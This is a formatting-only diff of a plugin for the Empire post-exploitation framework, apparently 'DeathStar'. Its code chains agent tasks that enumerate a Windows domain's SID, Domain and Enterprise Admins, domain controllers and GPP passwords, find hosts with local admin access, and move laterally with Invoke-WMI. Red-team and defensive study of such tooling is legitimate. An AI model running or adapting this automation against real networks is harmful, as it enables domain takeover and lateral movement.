@@ -9,8 +9,8 @@ from empire.server.core.db import models
 from empire.server.core.db.models import PluginTaskStatus
 from empire.server.core.hooks import hooks
 from empire.server.core.plugin_service import PluginService
-from empire.server.plugins.DeathStarPlugin.run_tasks import DeathStarTasks
-from empire.server.plugins.DeathStarPlugin.utils import (
+from .run_tasks import DeathStarTasks
+from .utils import (
     posh_object_parser,
 )
 
@@ -18,22 +18,16 @@ log = logging.getLogger(__name__)
 
 
 class Plugin(BasePlugin):
-
     @override
     def on_load(self, db):
-        self.execution_options  = {
-            'Agent': {
-                'Description': 'Name of Agent',
-                'Required': True,
-                'Value': ''
-            },
-
+        self.execution_options = {
+            "Agent": {"Description": "Name of Agent", "Required": True, "Value": ""},
         }
 
     @override
     def execute(self, command, **kwargs):
         try:
-            agent_name = command['Agent']
+            agent_name = command["Agent"]
             user = kwargs["user"]
             db = kwargs["db"]
 
@@ -62,18 +56,18 @@ class Plugin(BasePlugin):
             agent = self.main_menu.agentsv2.get_by_id(db, agent_name)
             self.session_id = agent.session_id
             self.listener_name = agent.listener
-            params = {
-                     "Agent": self.session_id,
-                     "OutputFunction": "Out-String"
-                }
-            module_post_request = ModulePostRequest(module_id="powershell_management_get_domain_sid",
-                                                    options=params)
-            res, err = self.main_menu.agenttasksv2.create_task_module(db, agent, module_post_request, 0)
+            params = {"Agent": self.session_id, "OutputFunction": "Out-String"}
+            module_post_request = ModulePostRequest(
+                module_id="powershell_management_get_domain_sid", options=params
+            )
+            res, err = self.main_menu.agenttasksv2.create_task_module(
+                db, agent, module_post_request, 0
+            )
 
             if err:
                 return f"[!] Error running module: {err}z"
             else:
-                self.task_ids['domain_sid'] = res.id
+                self.task_ids["domain_sid"] = res.id
             return "[*] Starting DeathStar..."
 
         except Exception as e:
@@ -89,17 +83,37 @@ class Plugin(BasePlugin):
         self.domain_controllers = None
         self.deathstar_tasks = DeathStarTasks(self.main_menu)
 
-        hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_domain_sid", self.get_domain_sid)
-        hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_domain_admin", self.get_domain_admin)
-        hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_enterprise_admin", self.get_enterprise_admin)
-        hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_domain_controller", self.get_domain_controller)
+        hooks.register_hook(
+            hooks.BEFORE_TASKING_RESULT_HOOK, "get_domain_sid", self.get_domain_sid
+        )
+        hooks.register_hook(
+            hooks.BEFORE_TASKING_RESULT_HOOK, "get_domain_admin", self.get_domain_admin
+        )
+        hooks.register_hook(
+            hooks.BEFORE_TASKING_RESULT_HOOK,
+            "get_enterprise_admin",
+            self.get_enterprise_admin,
+        )
+        hooks.register_hook(
+            hooks.BEFORE_TASKING_RESULT_HOOK,
+            "get_domain_controller",
+            self.get_domain_controller,
+        )
         hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_gpp", self.get_gpp)
-        hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_local_admin", self.get_local_admin)
-        hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_wmi", self.get_invoke_wmi)
-        hooks.register_hook(hooks.AFTER_AGENT_CHECKIN_HOOK, 'on_new_agent_checkin', self.on_new_agent_checkin)
+        hooks.register_hook(
+            hooks.BEFORE_TASKING_RESULT_HOOK, "get_local_admin", self.get_local_admin
+        )
+        hooks.register_hook(
+            hooks.BEFORE_TASKING_RESULT_HOOK, "get_wmi", self.get_invoke_wmi
+        )
+        hooks.register_hook(
+            hooks.AFTER_AGENT_CHECKIN_HOOK,
+            "on_new_agent_checkin",
+            self.on_new_agent_checkin,
+        )
 
     def get_task(self, db, task_id: int):
-        plugin = self.plugin_service.get_by_id(db, 'deathstar')
+        plugin = self.plugin_service.get_by_id(db, "deathstar")
         if plugin:
             task = (
                 db.query(models.PluginTask)
@@ -110,8 +124,9 @@ class Plugin(BasePlugin):
                 return task
 
         return None
+
     def on_new_agent_checkin(self, db, task):
-        if 'wmi' in self.task_ids:
+        if "wmi" in self.task_ids:
             plugin_task = self.get_task(db, self.plugin_task_id)
             plugin_task.output += f"[+] Access gained to {task.hostname}\n"
             db.add(plugin_task)
@@ -120,8 +135,8 @@ class Plugin(BasePlugin):
             self.task_ids = {}
 
     def get_invoke_wmi(self, db, task):
-        if 'wmi' in self.task_ids:
-            if task.id in self.task_ids['wmi']:
+        if "wmi" in self.task_ids:
+            if task.id in self.task_ids["wmi"]:
                 if task.output:
                     plugin_task = self.get_task(db, self.plugin_task_id)
                     plugin_task.output += f"{task.output}\n"
@@ -129,10 +144,10 @@ class Plugin(BasePlugin):
                     db.flush()
 
     def get_local_admin(self, db, task):
-        if 'local_admin' not in self.task_ids:
+        if "local_admin" not in self.task_ids:
             return
 
-        if task.id != self.task_ids['local_admin']:
+        if task.id != self.task_ids["local_admin"]:
             return
 
         if not task.output:
@@ -143,17 +158,20 @@ class Plugin(BasePlugin):
 
         self.localadmin_access = task.output.split("\r\n")[:-3]
         plugin_task = self.get_task(db, self.plugin_task_id)
-        plugin_task.output += f"[+] Local Admin Access found\n"
-        self.task_ids['wmi'] = []
+        plugin_task.output += "[+] Local Admin Access found\n"
+        self.task_ids["wmi"] = []
         for computer_name in self.localadmin_access:
-            self.task_ids['wmi'].append(
-                self.deathstar_tasks.run_invoke_wmi(db, self.session_id, self.listener_name, computer_name))
+            self.task_ids["wmi"].append(
+                self.deathstar_tasks.run_invoke_wmi(
+                    db, self.session_id, self.listener_name, computer_name
+                )
+            )
             plugin_task.output += f"[*] Attempting Invoke-WMI to {computer_name}\n"
             db.add(plugin_task)
             db.flush()
 
     def get_domain_sid(self, db, task):
-        if 'domain_sid' not in self.task_ids:
+        if "domain_sid" not in self.task_ids:
             return
 
         if not task.output:
@@ -172,17 +190,21 @@ class Plugin(BasePlugin):
             return
 
         plugin_task.output += f"[+] Group SID: {group_sid}\n"
-        self.task_ids['domain_admin'] = self.deathstar_tasks.run_get_group_member(db, group_sid + "-512",
-                                                                                  self.session_id)
-        self.task_ids['enterprise_admin'] = self.deathstar_tasks.run_get_group_member(db, group_sid + "-519",
-                                                                                      self.session_id)
-        self.task_ids['domain_controller'] = self.deathstar_tasks.run_get_domain_controller(db, self.session_id)
+        self.task_ids["domain_admin"] = self.deathstar_tasks.run_get_group_member(
+            db, group_sid + "-512", self.session_id
+        )
+        self.task_ids["enterprise_admin"] = self.deathstar_tasks.run_get_group_member(
+            db, group_sid + "-519", self.session_id
+        )
+        self.task_ids["domain_controller"] = (
+            self.deathstar_tasks.run_get_domain_controller(db, self.session_id)
+        )
 
     def get_domain_controller(self, db, task):
-        if 'domain_controller' not in self.task_ids:
+        if "domain_controller" not in self.task_ids:
             return
 
-        if task.id != self.task_ids['domain_controller']:
+        if task.id != self.task_ids["domain_controller"]:
             return
 
         if not task.output:
@@ -195,16 +217,16 @@ class Plugin(BasePlugin):
 
         plugin_task = self.get_task(db, self.plugin_task_id)
         self.domain_controllers = posh_object_parser(task.output)
-        plugin_task.output += f"[+] Domain Controllers found\n"
+        plugin_task.output += "[+] Domain Controllers found\n"
         db.add(plugin_task)
         db.flush()
-        self.task_ids['gpp'] = self.deathstar_tasks.run_get_gpp(db, self.session_id)
+        self.task_ids["gpp"] = self.deathstar_tasks.run_get_gpp(db, self.session_id)
 
     def get_domain_admin(self, db, task):
-        if 'domain_admin' not in self.task_ids:
+        if "domain_admin" not in self.task_ids:
             return
 
-        if task.id != self.task_ids['domain_admin']:
+        if task.id != self.task_ids["domain_admin"]:
             return
 
         if not task.output:
@@ -217,15 +239,15 @@ class Plugin(BasePlugin):
 
         self.domain_admins = posh_object_parser(task.output)
         plugin_task = self.get_task(db, self.plugin_task_id)
-        plugin_task.output += f"[+] Domain Admins found\n"
+        plugin_task.output += "[+] Domain Admins found\n"
         db.add(plugin_task)
         db.flush()
 
     def get_enterprise_admin(self, db, task):
-        if 'enterprise_admin' not in self.task_ids:
+        if "enterprise_admin" not in self.task_ids:
             return
 
-        if task.id != self.task_ids['enterprise_admin']:
+        if task.id != self.task_ids["enterprise_admin"]:
             return
 
         if not task.output:
@@ -238,15 +260,15 @@ class Plugin(BasePlugin):
 
         self.enterprise_admins = posh_object_parser(task.output)
         plugin_task = self.get_task(db, self.plugin_task_id)
-        plugin_task.output += f"[+] Enterprise Admins found\n"
+        plugin_task.output += "[+] Enterprise Admins found\n"
         db.add(plugin_task)
         db.flush()
 
     def get_gpp(self, db, task):
-        if 'gpp' not in self.task_ids:
+        if "gpp" not in self.task_ids:
             return
 
-        if task.id != self.task_ids['gpp']:
+        if task.id != self.task_ids["gpp"]:
             return
 
         if not task.output:
@@ -278,9 +300,12 @@ class Plugin(BasePlugin):
             plugin_task.output += "[!] No GPOs found\n"
         db.add(plugin_task)
         db.flush()
-        self.task_ids['local_admin'] = self.deathstar_tasks.run_find_localadmin(db, self.session_id,
-                                                                                self.domain_controllers[0]['name'],
-                                                                                self.domain_controllers[0]['domain'])
+        self.task_ids["local_admin"] = self.deathstar_tasks.run_find_localadmin(
+            db,
+            self.session_id,
+            self.domain_controllers[0]["name"],
+            self.domain_controllers[0]["domain"],
+        )
 
     @override
     def on_stop(self, db):
